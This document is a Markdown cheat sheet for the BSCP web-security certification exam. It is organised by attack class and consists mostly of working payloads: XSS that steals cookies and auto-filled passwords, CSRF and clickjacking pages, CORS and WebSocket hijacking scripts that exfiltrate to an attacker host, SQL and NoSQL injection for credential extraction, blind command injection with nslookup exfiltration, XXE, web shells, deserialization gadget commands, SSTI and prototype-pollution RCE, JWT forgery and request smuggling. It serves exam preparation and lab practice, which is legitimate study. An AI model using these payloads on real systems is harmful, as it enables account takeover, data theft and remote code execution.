# BSCP Exam Cheat Sheet

> Exam format: 2 apps, 4 hours, each app has 3 stages
> Stage 1: Get user access | Stage 2: Escalate to admin | Stage 3: Read `/home/carlos/secret`
> Only APPRENTICE + PRACTITIONER level techniques

---

## Table of Contents

1. [XSS](#xss)
2. [CSRF](#csrf)
3. [Clickjacking](#clickjacking)
4. [DOM-based Vulnerabilities](#dom-based-vulnerabilities)
5. [CORS](#cors)
6. [WebSockets](#websockets)
7. [SQL Injection](#sql-injection)
8. [Authentication](#authentication)
9. [Path Traversal](#path-traversal)
10. [OS Command Injection](#os-command-injection)
11. [Access Control](#access-control)
12. [SSRF](#ssrf)
13. [XXE Injection](#xxe-injection)
14. [Information Disclosure](#information-disclosure)
15. [File Upload](#file-upload)
16. [Business Logic](#business-logic)
17. [NoSQL Injection](#nosql-injection)
18. [Race Conditions](#race-conditions)
19. [API Testing](#api-testing)
20. [Web Cache Deception](#web-cache-deception)
21. [Web Cache Poisoning](#web-cache-poisoning)
22. [HTTP Host Header Attacks](#http-host-header-attacks)
23. [JWT Attacks](#jwt-attacks)
24. [OAuth Authentication](#oauth-authentication)
25. [Insecure Deserialization](#insecure-deserialization)
26. [SSTI](#ssti)
27. [Prototype Pollution](#prototype-pollution)
28. [GraphQL](#graphql)
29. [HTTP Request Smuggling](#http-request-smuggling)

---

## XSS

### Basic payloads
```html
<script>alert(1)</script>
<svg onload=alert(1)>
<img src=1 onerror=alert(1)>
```

### Context-specific

**HTML context (nothing encoded):**
```html
<script>alert(1)</script>
```

**Attribute context (angle brackets encoded):**
```html
" autofocus onfocus=alert(1) x="
```

**href attribute:**
```html
javascript:alert(1)
```

**JavaScript string (angle brackets encoded):**
```
'-alert(document.domain)-'
';alert(document.domain)//
```

**JavaScript string (single quote + backslash escaped):**
```html
</script><img src=1 onerror=alert(1)>
```

**JavaScript string (angle brackets + double quotes encoded, single quotes escaped):**
```
\';alert(document.domain)//
```

**onclick event (angle brackets + double quotes encoded, single quotes + backslash escaped):**
```
https://test.com&apos;-alert(document.domain)-&apos;
```

**Template literal:**
```
${alert(1)}
```

**Hidden input (Chrome only):**
```
/?'accesskey='x'onclick='alert(1)
```

### DOM XSS

**document.write sink:**
```
"><script>alert(1)</script>
```

**innerHTML sink** (script tags do not work):
```html
<img src=1 onerror=alert(1)>
```

**jQuery attr() sink:**
```
/feedback?returnPath=javascript:alert(1)
```

**jQuery selector + hashchange:**
```html
<iframe src="https://target/#" onload="this.src+='<img src=1 onerror=print()>'">
```

**AngularJS expression** (when ng-app present):
```
{{$eval.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

**Reflected DOM XSS** (eval sink):
```
a\"};alert(1);//
```

**Stored DOM XSS** (replace only first < >):
```
<><img src=1 onerror=alert(1)>
```

### Tags/events blocked

**Most tags blocked, body + onresize allowed:**
```html
<iframe src="https://target/?search=<body onresize=print()>" onload=this.style.width='100px'>
```

**All tags blocked except custom ones:**
```html
<script>
location = 'https://target/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>
```

**SVG markup allowed:**
```html
<svg><animatetransform onbegin=alert(1) attributeName=x dur=1s>
```

### Exploit XSS

**Steal cookies:**
```html
<script>fetch('https://attacker',{method:'POST',mode:'no-cors',body:document.cookie})</script>
```

**Capture passwords** (auto-fill):
```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://attacker',{method:'POST',mode:'no-cors',body:username.value+':'+this.value});">
```

**Bypass CSRF via XSS:**
```html
<script>
var req = new XMLHttpRequest();
req.onload = function() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=attacker@evil.com')
};
req.open('get','/my-account',true);
req.send();
</script>
```

---

## CSRF

### Basic payload (no defenses)
```html
<form method="POST" action="https://target/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

### Bypass techniques

**Token validation depends on method** -> switch POST to GET:
```html
<script>document.location='https://target/my-account/change-email?email=attacker@evil.com'</script>
```

**Token validation depends on token being present** -> remove csrf param

**Token not tied to session** -> reuse your own valid token

**Token tied to non-session cookie** -> inject csrfKey via CRLF:
```html
<img src="https://target/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR_KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

**Token duplicated in cookie** -> inject same token in cookie + param

### SameSite bypass

**Lax -> method override:**
```html
<script>document.location='https://target/my-account/change-email?email=test@evil.com&_method=POST'</script>
```

**Strict -> client-side redirect with path traversal:**
```html
<script>document.location='https://target/post/comment/confirmation?postId=1/../../my-account/change-email?email=test@evil.com&submit=1'</script>
```

**Lax via cookie refresh (OAuth SSO):**
```html
<script>
window.onclick = () => {
    window.open('https://target/social-login');
    setTimeout(() => document.forms[0].submit(), 5000);
}
</script>
```

### Referer bypass

**Referer depends on being present:**
```html
<meta name="referrer" content="never">
```

**Referer validation can be circumvented** (check contains domain):
```html
<meta name="referrer" content="unsafe-url">
<script>history.pushState("", "", "/?target-domain.com")</script>
```

---

## Clickjacking

### Basic template
```html
<style>
    iframe { position:relative; width:1400px; height:800px; opacity:0.0001; z-index:2; }
    div { position:absolute; top:540px; left:160px; z-index:1; }
</style>
<div>Click me</div>
<iframe src="https://target/my-account"></iframe>
```

### With prefilled form
```html
<iframe src="https://target/my-account?email=attacker@evil.com"></iframe>
```

### Bypass frame buster
```html
<iframe src="https://target/my-account?email=attacker@evil.com" sandbox="allow-forms"></iframe>
```

---

## DOM-based Vulnerabilities

### Web messages (postMessage)

**innerHTML sink:**
```html
<iframe src="https://target" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

**location.href sink (indexOf bypass):**
```html
<iframe src="https://target" onload="this.contentWindow.postMessage('javascript:print()//https:','*')">
```

**JSON.parse + load-channel:**
```html
<iframe src="https://target" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

### DOM clobbering
```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

### DOM cookie manipulation
```html
<iframe src="https://target/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://target';window.x=1;">
```

---

## CORS

### Basic origin reflection
```html
<script>
var req = new XMLHttpRequest();
req.onload = function() { location='/log?key='+this.responseText; };
req.open('get','https://target/accountDetails',true);
req.withCredentials = true;
req.send();
</script>
```

### Trusted null origin (sandbox iframe)
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
var req = new XMLHttpRequest();
req.onload = function() { location='https://attacker/log?key='+this.responseText; };
req.open('get','https://target/accountDetails',true);
req.withCredentials = true;
req.send();
</script>"></iframe>
```

### Trusted insecure protocol (XSS on subdomain)
- Find XSS on HTTP subdomain (e.g. `stock.target.com`)
- Use it to read `/accountDetails` and exfil

---

## WebSockets

### Cross-site WebSocket hijacking
```html
<script>
var ws = new WebSocket('wss://target/chat');
ws.onopen = function() { ws.send("READY"); };
ws.onmessage = function(event) {
    fetch('https://attacker/?message='+event.data);
};
</script>
```

### IP block bypass
- Add `X-Forwarded-For` header to handshake
- Obfuscate XSS: `<img src=1 OnErRor=alert\x601\x60>`

---

## SQL Injection

### Login bypass
```
administrator'--
```

### UNION attack flow
```
# 1. Find column count
' ORDER BY 3--
' UNION SELECT NULL,NULL,NULL--

# 2. Find string column
' UNION SELECT NULL,'test',NULL--

# 3. Get db version
Oracle:      ' UNION SELECT BANNER,NULL FROM v$version--
MySQL/MSSQL: ' UNION SELECT @@version,NULL--%20

# 4. List tables
Non-Oracle: ' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
Oracle:     ' UNION SELECT TABLE_NAME,NULL FROM ALL_TABLES--

# 5. List columns
Non-Oracle: ' UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE table_name='users_abc'--
Oracle:     ' UNION SELECT COLUMN_NAME,NULL FROM ALL_TAB_COLUMNS WHERE table_name='USERS_ABC'--

# 6. Extract data
' UNION SELECT username,password FROM users_abc--

# 7. Concat into single column
' UNION SELECT NULL,username||'-'||password FROM users--
```

### Blind SQL (TrackingId cookie)

**Conditional response** ("Welcome back" appears/disappears):
```
TrackingId=xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20--
TrackingId=xyz' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='administrator')>64--
```

**Conditional error** (200 vs 500, Oracle):
```
' AND (SELECT CASE WHEN (LENGTH(password)=20) THEN 1/0 ELSE 1 END FROM users WHERE username='administrator')=1--
```

**Visible error** (PostgreSQL, data in error):
```
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

**Time delay:**
```
Oracle:      ' AND 1=(SELECT dbms_pipe.receive_message('a',10) FROM dual)--
MSSQL:       ' WAITFOR DELAY '0:0:10'--
PostgreSQL:  '||pg_sleep(10)--
MySQL:       ' AND SLEEP(10)--%20
```

**OOB (Oracle):**
```
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://COLLABORATOR">%remote;]>'),'/l') FROM dual--
```

### XML WAF bypass
- Encode payload in decimal HTML entities (`&#49;&#32;...`)

---

## Authentication

### Bruteforce
- Lab 1: different response text -> enum username, then password
- Lab 4: subtly different response -> enum username
- Lab 5: response timing with long password + `X-Forwarded-For` to bypass IP lock
- Lab 6: alternate valid login every n-1 attempts to reset counter
- Lab 7: account lock -> different response for valid vs invalid user
- Lab 13: JSON payload with password array: `{"username":"admin","password":["pass1","pass2",...]}`

### 2FA bypass
- Lab 2: after login, skip 2FA page -> navigate directly to `/my-account`
- Lab 8: modify cookie to generate MFA for target user, then bruteforce
- Lab 14: macro login -> try MFA -> repeat

### Password reset
- Lab 3: no token validation -> change username in reset request
- Lab 11: `X-Forwarded-Host: attacker` -> reset link points to attacker server

### Stay logged in
- Lab 9: cookie = `base64(username:md5(password))` -> bruteforce offline
- Lab 10: XSS to steal cookie -> crack md5 -> login

---

## Path Traversal

```
../../../etc/passwd                          # simple (1)
/etc/passwd                                  # absolute path bypass (2)
....//....//....//etc/passwd                 # nested strip bypass (3)
%252e%252e%252f%252e%252e%252fetc/passwd     # double URL encode (4)
/var/www/images/../../../etc/passwd          # base path validation (5)
../../../etc/passwd%00.jpg                   # null byte + extension (6)
```

---

## OS Command Injection

```
;whoami;          &whoami#          |whoami          ||whoami||
```

**Blind - time delay:** `||ping -c 10 127.0.0.1||`
**Blind - output redirect:** `||whoami > /var/www/images/out.txt||` -> `/image?filename=out.txt`
**Blind - OOB:** `||nslookup attacker.com||`
**Blind - OOB exfil:** `` ||nslookup `whoami`.attacker.com|| ``

---

## Access Control

- **robots.txt / source code** -> hidden admin panel (1, 2)
- **Cookie/param** -> modify `Admin=true` or `roleid` (3, 4)
- **IDOR** -> change `?id=` param (5-9)
- **X-Original-URL header** -> bypass front-end ACL (10)
- **Method interchange** -> POST blocked, GET allowed (11)
- **Multi-step** -> replay final step only (12)
- **Referer header** -> add admin Referer (13)

---

## SSRF

```
stockApi=http://localhost/admin                              # basic (1)
stockApi=http://192.168.0.{1-255}:8080/admin                # internal scan (2)
Referer: http://attacker.com                                # blind OOB (3)
stockApi=http://127.1/%2561dmin                             # blacklist bypass (4)
stockApi=/product/nextProduct?path=http://192.168.0.12/admin # open redirect (5)
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).COLLAB   # Shellshock (6)
stockApi=http://localhost%23@stock.target.net/admin          # whitelist bypass (7)
```

---

## XXE Injection

**Basic file read:**
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

**SSRF:**
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
```

**Blind OOB (parameter entity):**
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker"> %xxe;]>
```

**Exfil via external DTD:**
```xml
<!-- On attacker server: -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker?x=%file;'>">
%eval; %exfil;
```

**Error-based:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval; %exfil;
```

**XInclude (no DOCTYPE control):**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

**SVG upload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="16">&xxe;</text></svg>
```

**Repurpose local DTD** -> override entity in known DTD file (e.g. `/usr/share/yelp/dtd/docbookx.dtd`)

---

## Information Disclosure

- **Error messages** -> send `?productId=asd` (1)
- **Debug page** -> check HTML comments for `/cgi-bin/phpinfo.php` (2)
- **Backup files** -> `/robots.txt` -> `/backup` (3)
- **TRACE method** -> reveals `X-Custom-IP-Authorization` header (4)
- **Git history** -> `/.git` -> `wget -r` -> `git diff` (5)

---

## File Upload

| Lab | Bypass | Payload |
|---|---|---|
| 1 | No validation | Upload `.php` shell directly |
| 2 | Content-Type only | Change to `image/jpeg` |
| 3 | Dir execution blocked | Path traversal: `%2e%2e%2fshell.php` |
| 4 | Extension blacklist | Upload `.htaccess` first: `AddType application/x-httpd-php .rce` |
| 5 | Extension whitelist | Null byte: `shell.php%00.jpg` |
| 6 | Magic bytes check | `exiftool -Comment="<?php ... ?>" img.jpg -o polyglot.php` |

**Shell payload:**
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

## Business Logic

- **Client-side price** -> modify price in request (1)
- **Negative quantity** -> buy target qty=1, other qty=-N (2)
- **Change email** -> register, change to `@dontwannacry.com` (3)
- **Coupon alternating** -> apply 2 codes alternating until 0 (4)
- **Integer overflow** -> add until price overflows (5)
- **Email truncation** -> 255 char limit, tail becomes `@dontwannacry.com` (6)
- **Remove param** -> remove `current_password` from change-password (7)
- **Skip step** -> navigate directly to confirmation URL (8)
- **Default admin role** -> skip `/role-selector` redirect (9)
- **Gift card loop** -> buy with coupon, redeem, repeat (+$3/cycle) (10)

---

## NoSQL Injection

**Syntax injection (show all):**
```
category=fizzy'||1==1%00
```

**Operator injection (auth bypass):**
```json
{"username":{"$regex":"admin.*"}, "password":{"$ne":""}}
```

**Extract password:**
```
admin' && this.password[0]=='a' || 'a'=='b
admin' && this.password.length==20 || 'a'=='b
```

**Extract field names:**
```json
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

---

## Race Conditions

- Send multiple identical requests in parallel (e.g. apply coupon)
- Burp Repeater group -> send parallel
- TOCTOU: server checks limit, applies, updates -> concurrent requests bypass

---

## API Testing

- **Find docs** -> `/api`, `/swagger`, `/openapi.json` (1)
- **Parameter pollution** -> `%26field=reset_token`, `%23` to truncate (2)
- **OPTIONS** -> find unused methods like PATCH -> modify price (3)
- **Mass assignment** -> GET returns hidden params like `chosen_discount` (4)
- **REST path traversal** -> `?name=peter%2f..%2fadmin` (5)

---

## Web Cache Deception

- **Path mapping** -> `/my-account/nonexistent.js` (1)
- **Delimiter** -> `/my-account;wcd.js`, `/my-account%3fwcd.css` (2)
- **Origin normalization** -> `/resources/..%2fmy-account` (3)
- **Cache normalization** -> `/my-account%23%2f%2e%2e%2fresources` (4)
- Check `X-Cache: hit` to confirm cached

---

## Web Cache Poisoning

**Unkeyed header -> XSS:**
```http
X-Forwarded-Host: attacker"><script>alert(1)</script>
```

**Unkeyed header -> import malicious JS:**
```http
X-Forwarded-Host: attacker.com
# Response: <script src="https://attacker.com/static/analytics.js">
```

**Unkeyed cookie:**
```http
Cookie: language="><script>alert(1)</script>
```

**Multiple headers** -> combine `X-Forwarded-Host` + `X-Forwarded-Scheme: http` to force redirect

**Unkeyed query string/param** -> test with Param Miner

**Use cache buster** (`?cb=123`) to avoid poisoning real users during testing

---

## HTTP Host Header Attacks

**Basic password reset poisoning:**
```http
Host: attacker.com
# Reset email link points to attacker -> steal token
```

**Host header auth bypass:**
```http
Host: localhost
# Access admin panel
```

**Ambiguous requests:**
```http
Host: target.com
Host: attacker.com
```

**Routing-based SSRF:**
```http
Host: 192.168.0.1
```

**Absolute URL + Host override:**
```http
GET https://target.com/ HTTP/1.1
Host: attacker.com
```

---

## JWT Attacks

**Unverified signature** -> change payload (username/role), keep signature (1)

**Algorithm none** -> set `"alg":"none"`, remove signature (2)

**Weak secret** -> brute-force with hashcat (3):
```bash
hashcat -a 0 -m 16500 <jwt> jwt.secrets.list --show
```

**JWK header injection** -> embed your own public key in `jwk` param (4)

**JKU header injection** -> point to attacker JWKS endpoint (5)

**KID path traversal** -> point to `/dev/null`, sign with empty string (6):
```json
{"kid":"../../../dev/null", "alg":"HS256"}
```

**Algorithm confusion** -> get public key from `/jwks.json`, sign with HS256 using public key as secret (7)

---

## OAuth Authentication

**Implicit flow** -> change user param in POST to server (1)

**Flawed CSRF** -> no `state` param -> force OAuth linking to attacker account (3)

**Redirect URI bypass** -> `redirect_uri=https://target/oauth?redirect=https://attacker` (4, 5)

**Recon endpoints:**
```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```

---

## Insecure Deserialization

### PHP
```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```
- Lab 1: change `b:0` -> `b:1` for admin
- Lab 2: change `access_token` type to `i:0` (PHP loose comparison)
- Lab 3: change `avatar_link` to `/home/carlos/morale.txt`
- Lab 4: find backup file (`~` suffix), exploit `__destruct()` with custom object

### Java
```bash
# ysoserial
java -jar ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```
- Look for `rO0` (base64) or `ac ed` (hex) in cookies

### PHP gadget chains
```bash
# phpggc
php phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' -o payload.txt
```
- Find framework + version via error, `SECRET_KEY` via phpinfo

### Ruby
- Use documented gadget chain from PayloadsAllTheThings
- Look for Marshal.load usage

### PHAR
- Upload polyglot JPG/PHAR file, trigger via `phar://` stream wrapper

---

## SSTI

### Detection decision tree
```
{{7*7}} -> 49? -> Jinja2/Twig
${7*7} -> 49? -> FreeMarker/Thymeleaf
<%= 7*7 %> -> 49? -> ERB
#{7*7} -> 49? -> Slim
```

### Payloads by engine

**ERB (Ruby):**
```ruby
<%= File.open('/home/carlos/secret').read %>
```

**Jinja2 (Python):**
```python
{{__import__('os').popen('cat /home/carlos/secret').read()}}
```

**FreeMarker (Java):**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /home/carlos/secret")}
```

**Handlebars (Node.js):** -> use documented RCE from HackTricks

**Django:**
```
{{ settings.SECRET_KEY }}
```

---

## Prototype Pollution

### Client-side detection
```javascript
// In URL or JSON input:
?__proto__[test]=polluted
// Check: Object.prototype.test === "polluted"
```

### Server-side detection
```json
{"__proto__":{"json spaces":10}}
// If response JSON is indented -> polluted
```

### Server-side RCE via prototype pollution
```json
{"__proto__":{"execArgv":["--eval=require('child_process').execSync('cat /home/carlos/secret')"]}}
```
```json
{"__proto__":{"shell":"node","NODE_OPTIONS":"--require=/proc/self/cmdline","argv0":"console.log(require('child_process').execSync('cat /home/carlos/secret').toString())//"}}
```

---

## GraphQL

### Find endpoint
```
/graphql, /api, /api/graphql, /graphql/api (+ /v1)
```

### Universal query
```json
{"query":"{__typename}"}
```

### Introspection
```json
{"query":"{ __schema { queryType { name } mutationType { name } types { name fields { name }}}}"}
```

### Bypass brute-force protection (aliases)
```graphql
query {
    a:login(input:{username:"admin",password:"pass1"}) { token }
    b:login(input:{username:"admin",password:"pass2"}) { token }
}
```

---

## HTTP Request Smuggling

### CL.TE
```http
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL
```http
POST / HTTP/1.1
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

### TE.TE (obfuscation)
```http
Transfer-Encoding: chunked
Transfer-Encoding: x
```
```http
Transfer-Encoding: xchunked
Transfer-encoding: chunked
```

### H2.CL / H2.TE
- HTTP/2 downgrade attacks
- CRLF injection in HTTP/2 headers

### CL.0
- Send to endpoint that does not expect body (e.g. static files)
- Back-end ignores Content-Length, front-end respects it

---

## Quick Reference: Exam Methodology

### Stage 1 - Get user access
1. Check for XSS (reflected, stored, DOM) -> steal cookies/credentials
2. Check for CSRF -> change victim email -> password reset
3. Check for auth bypass -> 2FA skip, broken logic
4. Check for OAuth flaws -> implicit flow, redirect_uri bypass
5. Check for CORS -> steal API key
6. Check for WebSocket hijacking -> steal chat history

### Stage 2 - Escalate to admin
1. Check for SQLi -> extract admin credentials
2. Check for access control flaws -> IDOR, method interchange, header injection
3. Check for SSRF -> access internal admin panel
4. Check for Host header attacks -> password reset poisoning, routing SSRF
5. Check for business logic flaws -> privilege escalation
6. Check for JWT attacks -> forge admin token
7. Check for NoSQL injection -> auth bypass

### Stage 3 - Read /home/carlos/secret
1. Check for SSTI -> RCE
2. Check for file upload -> web shell
3. Check for OS command injection -> read file
4. Check for insecure deserialization -> RCE
5. Check for XXE -> file read
6. Check for path traversal -> file read
7. Check for SSRF + XXE -> internal file access
8. Check for prototype pollution -> RCE
